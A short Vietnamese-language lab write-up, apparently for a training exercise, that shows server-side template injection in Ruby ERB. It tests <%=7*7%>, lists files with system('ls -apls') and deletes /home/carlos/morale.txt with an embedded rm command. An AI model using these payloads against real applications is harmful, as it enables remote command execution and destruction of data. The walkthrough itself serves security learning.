<img width="1218" height="512" alt="image" src="https://github.com/user-attachments/assets/de4d6a18-cc54-46ea-9edc-6733db2d1277" />

Mục tiêu: Đọc ERB documentation, xóa file morale.txt

Đọc tài liệu về ERB, biết được rằng giá trị được in ra được thể hiện như sau

<img width="1562" height="282" alt="image" src="https://github.com/user-attachments/assets/6d9818fa-e5df-4ab4-bf2a-be47b22d8453" />

Kiểm tra thử với payload

    <%=7*7%>

<img width="1865" height="962" alt="image" src="https://github.com/user-attachments/assets/a51b00ef-f416-4b98-9401-4f0164dd3522" />

Có thể thấy máy chủ đã thực thi kết quả

<img width="1650" height="661" alt="image" src="https://github.com/user-attachments/assets/162814b9-a098-4c72-9946-8d987eeeb768" />

Sau 1 hồi tìm kiếm thì thấy method này, nó sẽ thực thi lệnh trong shell nên dùng payload system("ls -apls") để kiểm tra tất cả các thư mục bên trong

<img width="1917" height="942" alt="image" src="https://github.com/user-attachments/assets/dc50fbe3-2935-44b9-96dd-e989344c2d65" />

Có thể thấy đã tìm ra thư mục morale.txt giờ chỉ cần xóa là xong

    <%= system("rm /home/carlos/morale.txt")%>

<img width="1917" height="965" alt="image" src="https://github.com/user-attachments/assets/d2d85ad8-cced-4440-8f32-759faee82a85" />
